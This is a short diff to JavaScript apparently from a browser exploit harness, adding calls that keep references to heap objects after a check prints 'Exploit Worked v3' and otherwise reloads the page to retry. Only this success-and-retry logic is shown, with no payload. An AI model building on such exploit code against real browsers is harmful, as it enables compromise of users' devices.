@@ -152,6 +152,9 @@ function go_() {
 	if(before_len != stale.length){
 		alert("Exploit Worked v3");
 		keep(arr);
+		keep(props);
+		keep(target);
+		keep(stale);
 	} else {
 		//alert("Exploit Failed");
 		document.location.reload();
